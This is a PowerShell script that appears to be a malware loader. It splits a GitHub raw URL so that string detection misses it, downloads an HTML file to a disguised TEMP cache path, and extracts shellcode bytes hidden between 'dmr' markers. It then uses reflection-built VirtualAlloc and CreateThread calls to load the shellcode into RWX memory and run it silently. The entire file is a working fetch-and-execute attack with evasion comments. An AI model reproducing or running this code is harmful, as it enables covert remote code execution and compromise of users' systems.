# 1. Setup Environment (Matching drop.ps1 paths)
$htmlPath = "$env:TEMP\sys_cache.html"
$s1 = "https://raw.githubuser"; $s2 = "content.com/gwyn1869/winupdate/main/test.html"
$htmlUrl = $s1 + $s2

# 2. Self-Healing Logic: Fetch only if missing or corrupted
if (!(Test-Path $htmlPath) -or (Get-Item $htmlPath).Length -lt 100) {
    # Fragmented download to evade basic string detection
    Invoke-RestMethod -Uri $htmlUrl -OutFile $htmlPath
}

# --- Injection Functions (Required for Memory Execution) ---

function Invoke-VirtualAlloc {
    Param ([IntPtr]$lpAddress, [UInt32]$dwSize, [UInt32]$flAllocationType, [UInt32]$flProtect)
    $AsmBuilder = [System.Reflection.Assembly].Assembly.GetTypes() | ? {$_.Name -eq 'AssemblyBuilder' }
    $AssemblyBuilder = $AsmBuilder::DefineDynamicAssembly('TestAssembly', 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('TestModule', $False)
    $TypeBuilder = $ModuleBuilder.DefineType('Kernel32', [Reflection.TypeAttributes]::Public)
    $MethodBuilder = $TypeBuilder.DefineMethod('VirtualAlloc', [Reflection.MethodAttributes] 'Public, Static, PinvokeImpl', [Reflection.CallingConventions] 'Standard', [IntPtr], [Type[]] @([IntPtr], [UInt32], [UInt32], [UInt32]))
    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([Type[]] @([String]))
    $FieldInfoArray = @([Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'), [Runtime.InteropServices.DllImportAttribute].GetField('ExactSpelling'), [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'), [Runtime.InteropServices.DllImportAttribute].GetField('PreserveSig'), [Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention'), [Runtime.InteropServices.DllImportAttribute].GetField('BestFitMapping'), [Runtime.InteropServices.DllImportAttribute].GetField('ThrowOnUnmappableChar'))
    $FieldArguments = @('VirtualAlloc', $False, $True, $True, [Runtime.InteropServices.CallingConvention]::Winapi, $False, $False)
    $CustomAttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, 'api-ms-win-core-memory-l1-1-0.dll', [Reflection.FieldInfo[]] $FieldInfoArray, [Object[]] $FieldArguments)
    $MethodBuilder.SetCustomAttribute($CustomAttribBuilder)
    $MethodBuilder.SetImplementationFlags([Reflection.MethodImplAttributes]::PreserveSig)
    $Kernel32 = $TypeBuilder.CreateType()
    $MethodInfo = New-Object Reflection.Emit.DynamicMethod('VirtualAlloc', [IntPtr], @([IntPtr], [UInt32], [UInt32], [UInt32]))
    $Generator = $MethodInfo.GetILGenerator()
    $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_0); $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_1); $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_2); $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_3); $Generator.Emit([System.Reflection.Emit.OpCodes]::Call, $Kernel32.GetMethod('VirtualAlloc')); $Generator.Emit([System.Reflection.Emit.OpCodes]::Ret)
    $ProxyMethod = $MethodInfo.CreateDelegate([Func``5[IntPtr, UInt32, UInt32, UInt32, IntPtr]])
    $ProxyMethod.Invoke($lpAddress, $dwSize, $flAllocationType, $flProtect)
}

function Invoke-CreateThread {
    Param ([IntPtr]$lpThreadAttributes, [UInt32]$dwStackSize, [IntPtr]$lpStartAddress, [IntPtr]$lpParameter, [UInt32]$dwCreationFlags, [IntPtr]$lpThreadId)
    $AsmBuilder = [System.Reflection.Assembly].Assembly.GetTypes() | ? {$_.Name -eq 'AssemblyBuilder' }
    $AssemblyBuilder = $AsmBuilder::DefineDynamicAssembly('TestAssembly_2', 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('TestModule', $False)
    $TypeBuilder = $ModuleBuilder.DefineType('Kernel32', [Reflection.TypeAttributes]::Public)
    $MethodBuilder = $TypeBuilder.DefineMethod('CreateThread', [Reflection.MethodAttributes] 'Public, Static, PinvokeImpl', [Reflection.CallingConventions] 'Standard', [IntPtr], [Type[]] @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]))
    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([Type[]] @([String]))
    $FieldInfoArray = @([Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'), [Runtime.InteropServices.DllImportAttribute].GetField('ExactSpelling'), [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'), [Runtime.InteropServices.DllImportAttribute].GetField('PreserveSig'), [Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention'), [Runtime.InteropServices.DllImportAttribute].GetField('BestFitMapping'), [Runtime.InteropServices.DllImportAttribute].GetField('ThrowOnUnmappableChar'))
    $FieldArguments = @('CreateThread', $False, $True, $True, [Runtime.InteropServices.CallingConvention]::Winapi, $False, $False)
    $CustomAttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, 'api-ms-win-core-processthreads-l1-1-0.dll', [Reflection.FieldInfo[]] $FieldInfoArray, [Object[]] $FieldArguments)
    $MethodBuilder.SetCustomAttribute($CustomAttribBuilder)
    $MethodBuilder.SetImplementationFlags([Reflection.MethodImplAttributes]::PreserveSig)
    $Kernel32 = $TypeBuilder.CreateType()
    $MethodInfo = New-Object Reflection.Emit.DynamicMethod('CreateThread', [IntPtr], @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]))
    $Generator = $MethodInfo.GetILGenerator()
    $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_0); $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_1); $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_2); $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_3); $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_S, ([Byte] 4)); $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_S, ([Byte] 5)); $Generator.Emit([System.Reflection.Emit.OpCodes]::Call, $Kernel32.GetMethod('CreateThread')); $Generator.Emit([System.Reflection.Emit.OpCodes]::Ret)
    $ProxyMethod = $MethodInfo.CreateDelegate([Func``7[IntPtr, UInt32, IntPtr, IntPtr, UInt32, IntPtr, IntPtr]])
    $ProxyMethod.Invoke($lpThreadAttributes, $dwStackSize, $lpStartAddress, $lpParameter, $dwCreationFlags, $lpThreadId)
}

# 3. Reassemble Byte Array from Local Cache
try {
    $htmlContent = Get-Content $htmlPath -Raw
    $Delim = "dmr"
    # Filter numeric bytes between 'dmr' tags
    $parts = [regex]::Matches($htmlContent, "(?<=dmr)(.*?)(?=dmr)").Value
    $byteArray = $parts | Where-Object { $_ -match '^\d+$' } | ForEach-Object { [byte]$_ }
} catch {
    Remove-Item $htmlPath -Force
    return
}

# 4. Execution Logic (Memory Injection)
if ($byteArray.Length -gt 10) {
    # Allocate (0x3000 = Commit/Reserve, 0x40 = RWX)
    $ShellcodeAddr = Invoke-VirtualAlloc -lpAddress ([IntPtr]::Zero) -dwSize $byteArray.Length -flAllocationType 0x3000 -flProtect 0x40
    
    if ($ShellcodeAddr -ne [IntPtr]::Zero) {
        [System.Runtime.InteropServices.Marshal]::Copy($byteArray, 0, $ShellcodeAddr, $byteArray.Length)
        
        # Launching thread silently
        Invoke-CreateThread -lpThreadAttributes ([IntPtr]::Zero) -dwStackSize 0 -lpStartAddress $ShellcodeAddr -lpParameter ([IntPtr]::Zero) -dwCreationFlags 0 -lpThreadId ([IntPtr]::Zero) | Out-Null
        
        # Prevent script from closing immediately
        Start-Sleep -Seconds 5
    }
}
